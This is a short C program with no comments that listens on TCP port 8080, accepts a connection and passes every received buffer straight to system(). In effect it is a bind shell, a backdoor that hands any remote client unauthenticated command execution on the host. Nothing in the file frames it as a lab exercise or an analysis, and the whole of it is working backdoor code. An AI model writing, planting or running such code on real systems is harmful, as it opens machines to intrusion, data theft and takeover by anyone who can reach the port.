#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <string.h>

void func(int connfd)
{
    int n;
    char buff[80];
    while (1)
    {
        if ((recv(connfd, buff, sizeof(buff), 0)))
            system(buff);
        printf("\n");
    }
}

void main()
{
    int sockfd, connfd, n, pid;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv, cli;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(8080);
    serv.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&serv, sizeof(serv));

    listen(sockfd, 3);

    n = sizeof(struct sockaddr_in);

    connfd = accept(sockfd, (struct sockaddr *)&cli, &n);

    if ((pid = fork()) == 0)
    {
        close(sockfd);
        func(connfd);
    }
    close(connfd);
}